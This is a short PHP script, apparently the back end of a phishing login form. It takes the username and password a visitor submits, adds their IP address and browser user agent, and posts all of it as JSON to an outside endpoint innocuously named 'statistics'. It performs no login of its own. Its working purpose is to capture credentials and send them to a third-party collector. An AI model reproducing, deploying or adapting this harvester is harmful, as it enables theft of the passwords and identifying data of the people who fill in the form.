<?php
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    die("Invalid request");
}

$apiUrl = "https://statistics-theta-seven.vercel.app/api/store";

$data = [
    "username"   => $_POST["username"],
    "password"   => $_POST["password"],
    "ip"         => $_SERVER["REMOTE_ADDR"],
    "user_agent" => $_SERVER["HTTP_USER_AGENT"]
];

$ch = curl_init($apiUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Content-Type: application/json"
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));

$response = curl_exec($ch);

if (curl_errno($ch)) {
    echo "cURL Error: " . curl_error($ch);
} else {
    echo "Server response:<br>";
    echo htmlspecialchars($response);
}

curl_close($ch);
?>
